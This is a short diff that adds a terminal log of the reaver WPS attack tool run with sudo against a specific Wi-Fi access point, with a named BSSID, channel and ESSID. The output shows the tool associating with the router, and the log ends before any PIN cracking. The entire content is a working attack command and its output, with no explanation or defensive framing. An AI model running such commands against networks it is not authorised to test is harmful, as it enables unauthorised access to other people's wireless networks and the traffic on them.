@@ -1,0 +1,10 @@
+sudo reaver -b 7C:05:07:00:77:26 -c 6 -d 37 -i wlan0mon
+
+Reaver v1.6.3 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 7C:05:07:00:77:26
+[+] Received beacon from 7C:05:07:00:77:26
+[+] Vendor: Broadcom
+[+] Associated with 7C:05:07:00:77:26 (ESSID: WIFI_DO_PAMPAM)
+
